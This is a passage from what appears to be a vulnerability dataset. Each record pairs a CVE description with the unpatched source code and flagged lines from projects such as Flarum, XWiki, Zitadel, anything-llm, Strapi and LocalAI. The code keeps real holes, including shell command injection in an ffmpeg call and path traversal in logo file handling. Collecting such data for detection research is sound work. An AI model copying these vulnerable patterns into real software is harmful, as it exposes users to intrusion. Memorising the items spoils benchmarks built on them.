      ],
      "hunk_level": [
        {
          "line_no": 116,
          "content": "        final Session session = this.context.get().getLocalScope().getSession();"
        },
        {
          "line_no": 119,
          "content": "            session.setAttribute( authInfo );"
        },
        {
          "line_no": 120,
          "content": "        }"
        },
        {
          "line_no": 122,
          "content": "        if ( this.sessionTimeout != null )"
        },
        {
          "line_no": 123,
          "content": "        {"
        },
        {
          "line_no": 124,
          "content": "            setSessionTimeout();"
        },
        {
          "line_no": 152,
          "content": "        return IdProviders.from( idProviders.stream()."
        },
        {
          "line_no": 153,
          "content": "            sorted( Comparator.comparing( u -> u.getKey().toString() ) )."
        },
        {
          "line_no": 154,
          "content": "            collect( Collectors.toList() ) );"
        },
        {
          "line_no": 224,
          "content": "        return ContextBuilder.from( this.context.get() )."
        },
        {
          "line_no": 225,
          "content": "            authInfo( authInfo )."
        },
        {
          "line_no": 226,
          "content": "            repositoryId( SystemConstants.SYSTEM_REPO_ID )."
        },
        {
          "line_no": 227,
          "content": "            branch( SecurityConstants.BRANCH_SECURITY ).build()."
        },
        {
          "line_no": 228,
          "content": "            callWith( runnable );"
        }
      ]
    },
    "cwe": [
      "CWE-384"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 59,
    "cve": "CVE-2025-27794",
    "description": "Flarum is open-source forum software. A session hijacking vulnerability exists in versions prior to 1.8.10 when an attacker-controlled authoritative subdomain under a parent domain (e.g., `subdomain.host.com`) sets cookies scoped to the parent domain (`.host.com`). This allows session token replacement for applications hosted on sibling subdomains (e.g., `community.host.com`) if session tokens aren't rotated post-authentication. Key Constraints are that the attacker must control any subdomain under the parent domain (e.g., `evil.host.com` or `x.y.host.com`), and the parent domain must not be on the Public Suffix List. Due to non-existent session token rotation after authenticating we can theoretically reproduce the vulnerability by using browser dev tools, but due to the browser's security measures this does not seem to be exploitable as described. Version 1.8.10 contains a patch for the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "framework/core/src/Http/Middleware/RememberFromCookie.php",
          "content": "<?php\n\n/*\n * This file is part of Flarum.\n *\n * For detailed copyright and license information, please view the\n * LICENSE file that was distributed with this source code.\n */\n\nnamespace Flarum\\Http\\Middleware;\n\nuse Flarum\\Http\\AccessToken;\nuse Flarum\\Http\\CookieFactory;\nuse Flarum\\Http\\RememberAccessToken;\nuse Illuminate\\Support\\Arr;\nuse Psr\\Http\\Message\\ResponseInterface as Response;\nuse Psr\\Http\\Message\\ServerRequestInterface as Request;\nuse Psr\\Http\\Server\\MiddlewareInterface as Middleware;\nuse Psr\\Http\\Server\\RequestHandlerInterface as Handler;\n\nclass RememberFromCookie implements Middleware\n{\n    /**\n     * @var CookieFactory\n     */\n    protected $cookie;\n\n    /**\n     * @param CookieFactory $cookie\n     */\n    public function __construct(CookieFactory $cookie)\n    {\n        $this->cookie = $cookie;\n    }\n\n    public function process(Request $request, Handler $handler): Response\n    {\n        $id = Arr::get($request->getCookieParams(), $this->cookie->getName('remember'));\n\n        if ($id) {\n            $token = AccessToken::findValid($id);\n\n            if ($token && $token instanceof RememberAccessToken) {\n                $token->touch($request);\n\n                /** @var \\Illuminate\\Contracts\\Session\\Session $session */\n                $session = $request->getAttribute('session');\n                $session->put('access_token', $token->token);\n            }\n        }\n\n        return $handler->handle($request);\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function process(Request $request, Handler $handler): Response\n    {\n        $id = Arr::get($request->getCookieParams(), $this->cookie->getName('remember'));\n\n        if ($id) {\n            $token = AccessToken::findValid($id);\n\n            if ($token && $token instanceof RememberAccessToken) {\n                $token->touch($request);\n\n                /** @var \\Illuminate\\Contracts\\Session\\Session $session */\n                $session = $request->getAttribute('session');\n                $session->put('access_token', $token->token);\n            }\n        }\n\n        return $handler->handle($request);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 48,
          "content": "                $session->put('access_token', $token->token);"
        }
      ]
    },
    "cwe": [
      "CWE-74"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_version": 3.1
  },
  {
    "id": 617,
    "cve": "CVE-2024-31986",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.19, 15.5.4, and 15.10-rc-1, by creating a document with a special crafted documented reference and an `XWiki.SchedulerJobClass` XObject, it is possible to execute arbitrary code on the server whenever an admin visits the scheduler page or the scheduler page is referenced, e.g., via an image in a comment on a page in the wiki. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, apply the patch manually by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352",
      "CWE-95"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.0,
    "cvss_version": 3.1
  },
  {
    "id": 1037,
    "cve": "CVE-2024-41953",
    "description": "Zitadel is an open source identity management system. ZITADEL uses HTML for emails and renders certain information such as usernames dynamically. That information can be entered by users or administrators. Due to a missing output sanitization, these emails could include malicious code. This may potentially lead to a threat where an attacker, without privileges, could send out altered notifications that are part of the registration processes. An attacker could create a malicious link, where the injected code would be rendered as part of the email. On the user's detail page, the username was also not sanitized and would also render HTML, giving an attacker the same vulnerability. While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by most email clients and the Content Security Policy in Console UI. This vulnerability is fixed in 2.58.1, 2.57.1, 2.56.2, 2.55.5, 2.54.8 2.53.9, and 2.52.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/notification/templates/templateData.go",
          "content": "package templates\n\nimport (\n\t\"fmt\"\n\t\"html\"\n\n\t\"github.com/zitadel/zitadel/internal/domain\"\n\t\"github.com/zitadel/zitadel/internal/i18n\"\n)\n\nconst (\n\tDefaultFontFamily      = \"-apple-system, BlinkMacSystemFont, Segoe UI, Lato, Arial, Helvetica, sans-serif\"\n\tDefaultFontColor       = \"#22292f\"\n\tDefaultBackgroundColor = \"#fafafa\"\n\tDefaultPrimaryColor    = \"#5282C1\"\n)\n\ntype TemplateData struct {\n\tTitle           string\n\tPreHeader       string\n\tSubject         string\n\tGreeting        string\n\tText            string\n\tURL             string\n\tButtonText      string\n\tPrimaryColor    string\n\tBackgroundColor string\n\tFontColor       string\n\tLogoURL         string\n\tFontURL         string\n\tFontFaceFamily  string\n\tFontFamily      string\n\n\tIncludeFooter bool\n\tFooterText    string\n}\n\nfunc (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}\n"
        }
      ],
      "method_level": [
        "func (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.3,
    "cvss_version": 3.1
  },
  {
    "id": 349,
    "cve": "CVE-2024-0440",
    "description": "Attacker, with permission to submit a link or submits a link via POST  to be collected that is using the file:// protocol can then introspect host files and other relatively stored files.",
    "vulnerability": {
      "file_level": [
        {
          "name": "collector/utils/url/index.js",
          "content": "function validURL(url) {\n  try {\n    new URL(url);\n    return true;\n  } catch {}\n  return false;\n}\n\nmodule.exports = {\n  validURL,\n};\n"
        }
      ],
      "method_level": [
        "function validURL(url) {\n  try {\n    new URL(url);\n    return true;\n  } catch {}\n  return false;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 3,
          "content": "    new URL(url);"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 581,
    "cve": "CVE-2024-3025",
    "description": "mintplex-labs/anything-llm is vulnerable to path traversal attacks due to insufficient validation of user-supplied input in the logo filename functionality. Attackers can exploit this vulnerability by manipulating the logo filename to reference files outside of the restricted directory. This can lead to unauthorized reading or deletion of files by utilizing the `/api/system/upload-logo` and `/api/system/logo` endpoints. The issue stems from the lack of filtering or validation on the logo filename, allowing attackers to target sensitive files such as the application's database.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/utils/files/logo.js",
          "content": "const path = require(\"path\");\nconst fs = require(\"fs\");\nconst { getType } = require(\"mime\");\nconst { v4 } = require(\"uuid\");\nconst { SystemSettings } = require(\"../../models/systemSettings\");\nconst LOGO_FILENAME = \"anything-llm.png\";\n\nfunction validFilename(newFilename = \"\") {\n  return ![LOGO_FILENAME].includes(newFilename);\n}\n\nfunction getDefaultFilename() {\n  return LOGO_FILENAME;\n}\n\nasync function determineLogoFilepath(defaultFilename = LOGO_FILENAME) {\n  const currentLogoFilename = await SystemSettings.currentLogoFilename();\n  const basePath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\")\n    : path.join(__dirname, \"../../storage/assets\");\n  const defaultFilepath = path.join(basePath, defaultFilename);\n\n  if (currentLogoFilename && validFilename(currentLogoFilename)) {\n    customLogoPath = path.join(basePath, currentLogoFilename);\n    return fs.existsSync(customLogoPath) ? customLogoPath : defaultFilepath;\n  }\n\n  return defaultFilepath;\n}\n\nfunction fetchLogo(logoPath) {\n  if (!fs.existsSync(logoPath)) {\n    return {\n      found: false,\n      buffer: null,\n      size: 0,\n      mime: \"none/none\",\n    };\n  }\n\n  const mime = getType(logoPath);\n  const buffer = fs.readFileSync(logoPath);\n  return {\n    found: true,\n    buffer,\n    size: buffer.length,\n    mime,\n  };\n}\n\nasync function renameLogoFile(originalFilename = null) {\n  const extname = path.extname(originalFilename) || \".png\";\n  const newFilename = `${v4()}${extname}`;\n  const originalFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)\n    : path.join(__dirname, `../../storage/assets/${originalFilename}`);\n  const outputFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)\n    : path.join(__dirname, `../../storage/assets/${newFilename}`);\n\n  fs.renameSync(originalFilepath, outputFilepath);\n  return newFilename;\n}\n\nasync function removeCustomLogo(logoFilename = LOGO_FILENAME) {\n  if (!logoFilename || !validFilename(logoFilename)) return false;\n  const logoPath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)\n    : path.join(__dirname, `../../storage/assets/${logoFilename}`);\n  if (fs.existsSync(logoPath)) fs.unlinkSync(logoPath);\n  return true;\n}\n\nmodule.exports = {\n  fetchLogo,\n  renameLogoFile,\n  removeCustomLogo,\n  validFilename,\n  getDefaultFilename,\n  determineLogoFilepath,\n  LOGO_FILENAME,\n};\n"
        }
      ],
      "method_level": [
        "async function determineLogoFilepath(defaultFilename = LOGO_FILENAME) {\n  const currentLogoFilename = await SystemSettings.currentLogoFilename();\n  const basePath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\")\n    : path.join(__dirname, \"../../storage/assets\");\n  const defaultFilepath = path.join(basePath, defaultFilename);\n\n  if (currentLogoFilename && validFilename(currentLogoFilename)) {\n    customLogoPath = path.join(basePath, currentLogoFilename);\n    return fs.existsSync(customLogoPath) ? customLogoPath : defaultFilepath;\n  }\n\n  return defaultFilepath;\n}",
        "async function renameLogoFile(originalFilename = null) {\n  const extname = path.extname(originalFilename) || \".png\";\n  const newFilename = `${v4()}${extname}`;\n  const originalFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)\n    : path.join(__dirname, `../../storage/assets/${originalFilename}`);\n  const outputFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)\n    : path.join(__dirname, `../../storage/assets/${newFilename}`);\n\n  fs.renameSync(originalFilepath, outputFilepath);\n  return newFilename;\n}",
        "async function removeCustomLogo(logoFilename = LOGO_FILENAME) {\n  if (!logoFilename || !validFilename(logoFilename)) return false;\n  const logoPath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)\n    : path.join(__dirname, `../../storage/assets/${logoFilename}`);\n  if (fs.existsSync(logoPath)) fs.unlinkSync(logoPath);\n  return true;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "    customLogoPath = path.join(basePath, currentLogoFilename);"
        },
        {
          "line_no": 55,
          "content": "    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)"
        },
        {
          "line_no": 56,
          "content": "    : path.join(__dirname, `../../storage/assets/${originalFilename}`);"
        },
        {
          "line_no": 58,
          "content": "    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)"
        },
        {
          "line_no": 59,
          "content": "    : path.join(__dirname, `../../storage/assets/${newFilename}`);"
        },
        {
          "line_no": 68,
          "content": "    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)"
        },
        {
          "line_no": 69,
          "content": "    : path.join(__dirname, `../../storage/assets/${logoFilename}`);"
        }
      ]
    },
    "cwe": [
      "CWE-23"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.9,
    "cvss_version": 3.0
  },
  {
    "id": 839,
    "cve": "CVE-2024-29181",
    "description": "Strapi is an open-source content management system. Prior to version 4.19.1, a super admin can create a collection where an item in the collection has an association to another collection. When this happens, another user with Author Role can see the list of associated items they did not create. They should see nothing but their own items they created not all items ever created. Users should upgrade @strapi/plugin-content-manager to version 4.19.1 to receive a patch.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/core/content-type-builder/admin/src/components/FormModal/component/createComponentSchema.ts",
          "content": "import { translatedErrors as errorsTrads } from '@strapi/helper-plugin';\nimport * as yup from 'yup';\n\nimport { getTrad } from '../../../utils/getTrad';\nimport { CATEGORY_NAME_REGEX } from '../category/regex';\nimport { createComponentUid } from '../utils/createUid';\n\nexport const createComponentSchema = (\n  usedComponentNames: Array<string>,\n  reservedNames: Array<string>,\n  category: string\n) => {\n  const shape = {\n    displayName: yup\n      .string()\n      .test({\n        name: 'nameAlreadyUsed',\n        message: errorsTrads.unique,\n        test(value) {\n          if (!value) {\n            return false;\n          }\n\n          const name = createComponentUid(value, category);\n\n          return !usedComponentNames.includes(name);\n        },\n      })\n      .test({\n        name: 'nameNotAllowed',\n        message: getTrad('error.contentTypeName.reserved-name'),\n        test(value) {\n          if (!value) {\n            return false;\n          }\n          return !reservedNames.includes(value?.trim()?.toLowerCase());\n        },\n      })\n      .required(errorsTrads.required),\n    category: yup\n      .string()\n      .matches(CATEGORY_NAME_REGEX, errorsTrads.regex)\n      .required(errorsTrads.required),\n\n    icon: yup.string(),\n  };\n\n  return yup.object(shape);\n};\n"
        }
      ],
      "method_level": [
        "createComponentSchema"
      ],
      "hunk_level": [
        {
          "line_no": 11,
          "content": "  category: string"
        },
        {
          "line_no": 26,
          "content": "          return !usedComponentNames.includes(name);"
        }
      ]
    },
    "cwe": [
      "CWE-639"
    ],
    "severity": "LOW",
    "cvss_score": 2.3,
    "cvss_version": 3.1
  },
  {
    "id": 578,
    "cve": "CVE-2024-2029",
    "description": "A command injection vulnerability exists in the `TranscriptEndpoint` of mudler/localai, specifically within the `audioToWav` function used for converting audio files to WAV format for transcription. The vulnerability arises due to the lack of sanitization of user-supplied filenames before passing them to ffmpeg via a shell command, allowing an attacker to execute arbitrary commands on the host system. Successful exploitation could lead to unauthorized access, data breaches, or other detrimental impacts, depending on the privileges of the process executing the code.",
    "vulnerability": {
      "file_level": [
        {
          "name": "backend/go/transcribe/transcript.go",
          "content": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"path/filepath\"\n\n\t\"github.com/ggerganov/whisper.cpp/bindings/go/pkg/whisper\"\n\t\"github.com/go-audio/wav\"\n\t\"github.com/go-skynet/LocalAI/core/schema\"\n)\n\nfunc sh(c string) (string, error) {\n\tcmd := exec.Command(\"/bin/sh\", \"-c\", c)\n\tcmd.Env = os.Environ()\n\to, err := cmd.CombinedOutput()\n\treturn string(o), err\n}\n\n// AudioToWav converts audio to wav for transcribe. It bashes out to ffmpeg\n// TODO: use https://github.com/mccoyst/ogg?\nfunc audioToWav(src, dst string) error {\n\tout, err := sh(fmt.Sprintf(\"ffmpeg -i %s -format s16le -ar 16000 -ac 1 -acodec pcm_s16le %s\", src, dst))\n\tif err != nil {\n\t\treturn fmt.Errorf(\"error: %w out: %s\", err, out)\n\t}\n\n\treturn nil\n}\n\nfunc Transcript(model whisper.Model, audiopath, language string, threads uint) (schema.Result, error) {\n\tres := schema.Result{}\n\n\tdir, err := os.MkdirTemp(\"\", \"whisper\")\n\tif err != nil {\n\t\treturn res, err\n\t}\n\tdefer os.RemoveAll(dir)\n\n\tconvertedPath := filepath.Join(dir, \"converted.wav\")\n\n\tif err := audioToWav(audiopath, convertedPath); err != nil {\n\t\treturn res, err\n\t}\n\n\t// Open samples\n\tfh, err := os.Open(convertedPath)\n\tif err != nil {\n\t\treturn res, err\n\t}\n\tdefer fh.Close()\n\n\t// Read samples\n\td := wav.NewDecoder(fh)\n\tbuf, err := d.FullPCMBuffer()\n\tif err != nil {\n\t\treturn res, err\n\t}\n\n\tdata := 